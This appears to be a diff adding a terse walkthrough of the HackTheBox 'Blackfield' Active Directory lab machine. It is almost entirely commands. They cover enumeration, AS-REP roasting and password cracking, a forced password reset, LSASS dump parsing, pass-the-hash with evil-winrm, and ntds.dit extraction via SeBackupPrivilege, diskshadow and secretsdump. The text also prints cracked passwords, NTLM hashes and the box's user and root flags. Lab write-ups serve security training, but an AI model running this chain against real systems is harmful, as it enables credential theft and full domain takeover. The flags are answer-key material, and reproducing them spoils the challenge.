@@ -1,0 +1,156 @@
+				# blackfield Active directory htb walkthrough#
+
+nmap scan : - 
+nmap -A -sV -T4 -sC x.x.x.x -oN scan.txt
+
+port open like : - 
+53,88,135,389,445,593,3268,5985
+
+Enumeration and initial exploit :- 
+dig @x.x.x.x AXFR blackfield.local   -- transfer faild
+
+ldapserach -x -h x.x.x.x "dc=blackfield,dc=local"
+GetNPUsers.py blackfield.local/ -dc-ip x.x.x.x
+rpcclient x.x.x.x -U""
+smbclient -L x.x.x.x -U""
+enum4linux x.x.x.x -a
+
+smbclinet \\\\x.x.x.x\\forensics$ -U ""
+smbclient \\\\x.x.x.x\\profiles$ -U ""
+ls
+
+copy all users names in user.txt file 
+
+cat user.txt | awk '{print $1}' > users.txt
+
+AS-REP Roasting the support account : - 
+
+kerbrute -domain blackfield.local -users users.txt -dc-ip x.x.x.x
+GetNPUsers.py blackfield.local/support -dc-ip x.x.x.x -no-pass
+
+hashcat -h | grep -i "as-rep"
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt   -- password is  #00^BlackKnight
+
+privilege escalation part 1 :- 
+
+crackmapexec smb x.x.x.x -u support -p '#00^BlackKnight'
+crackmapexec winrm x.x.x.x -u support -p '#00^BlackKnight'
+
+psexec.py support:'#00^BlackKnight'@x.x.x.x
+
+enum4linux -a -u support -p '#00^BlackKnight' x.x.x.x > enum.txt
+
+vim usersv2.txt 
+cat usersv2.txt
+cut -d[ -f2 usersv2.txt | awk '{print $1}' | cut -d] -f1
+cut -d[ -f2 usersv2.txt | awk '{print $1}' | cut -d] -f1 > users_final.txt
+cat users_final.txt
+
+kerbrute -domain blackfield.local -users users_final.txt -password '#00^BlackKnight' -dc-ip x.x.x.x
+
+GetUserSPN.py blackfield.local/support:#00^BlackKnight' -dc-ip x.x.x.x
+
+/opt/Windows/BloodHound_python/bloodhound.py -d blackfield.local -u support -p '#00^BlackKnight' -g DC01.blackfield.local -c all -ns x.x.x.x
+
+ls
+sudo bloodhound
+sudo neo4j console
+
+upload all json file in bloodhound 
+
+
+changing the audit2020 account's password :-
+rpcclient x.x.x.x -U "support"
+setuserinfo2
+setuserinfo2 audit2020 23 Password123
+exit
+
+crackmapexec smb x.x.x.x -u audit2020 -p Password123
+
+privilege escalation part 2 audit2020 >> svc_backup :- 
+
+crackmapexec smb x.x.x.x -u audit2020 -p Password123 --shares
+
+smbclient \\\\x.x.x.x\\forensics -U "audit2020"
+
+recurse on 
+prompt off
+ls
+			now you will see lsass.zip file download it . 
+get lsass.zip
+exit
+
+unzip lsass.zip
+pypykatz lsa minidump lsass.DMP
+
+Testing for the quick wins first , we can try to dump all the hashes in the domain with a DCSync using either the administrator account of DC01$ account.
+
+secretsdump.py blackfield.local/administrator@10.10.10.192 -hashes :7f1e4ff8c6a8e6b6fcae2d9c0572cd62 -dc-ip 10.10.10.192
+secretsdump.py blackfield.local/'dc01$'@10.10.10.192 -hashes :b624dc83a27cc29da11d9bf25efea796 -dc-ip 10.10.10.192
+
+Gainning a foothold as he 'svc_backup' account with a pass-the-hash attack :- 
+
+
+crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+
+evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
+
+
+privilege escalation part 3 :-
+
+whoami /priv
+
+reg save hklm\sam C:\temp\sam
+reg save hklm\system C:\temp\system
+
+go to the C:\profiles 
+echo "test" > test.txt
+ls
+
+smbclient \\\\x.x.x.x\\profiles$
+prompt off
+mget sam
+mget system
+exit
+
+secretdump.py -sam sam -system system LOCAL
+
+crackmapexec winrm 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051 --local-auth
+crackmapexec winrm 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051
+
+Dumping the ntds.dit hashes with sebackupprivilege : - 
+robocopy /b C:\Windows\NTDS C:\Profiles NTDS.dit
+
+echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
+echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
+echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
+
+diskshadow.exe /s c:\temp\diskshadow.txt
+
+cd Z:
+cd windows
+cd ntds
+robocopy /b .\ C:\temp NTDS.dit
+
+ls C:\temp
+now you will see ntds.dit file 
+
+cd C:\temp
+reg.exe save hklm\system C:\temp\system.bak
+
+download ntds.dit
+download system.bak
+
+
+secretsdump.py -ntds ntds.dit -system system.bak LOCAL > hashes.txt
+
+pass the hash attack to get a shell as the domain admin account : - 
+
+evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
+
+
+user flag : - c7eaff23ca601233057d6f6680aae31f
+root flag : - 614fba215e4434759b470e19dce7cead
+
+
